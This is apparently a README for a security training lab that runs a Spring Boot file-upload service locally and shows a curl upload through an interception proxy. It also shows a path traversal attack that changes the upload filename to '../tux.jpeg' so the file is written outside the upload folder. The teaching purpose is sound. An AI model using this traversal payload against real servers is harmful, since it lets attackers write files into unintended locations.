# File Upload

## Setup 

We can start the service as a separate process:
```
$ mvn spring-boot:run
```

## Attacking the File Upload

To upload a file we can use the following `curl` statement:

```
$ curl -ki --proxy http://localhost:8010 -F "file=@./images/tux.jpeg" https://localhost:8443/upload
```

### Path Traversal Attack
To perform the attack, use the interception proxy and change
the filename:
```
Content-Disposition: form-data; name="file"; filename="../tux.jpeg"
Content-Type: image/jpeg
```
The file is saved parallel to the `upload/` folder.
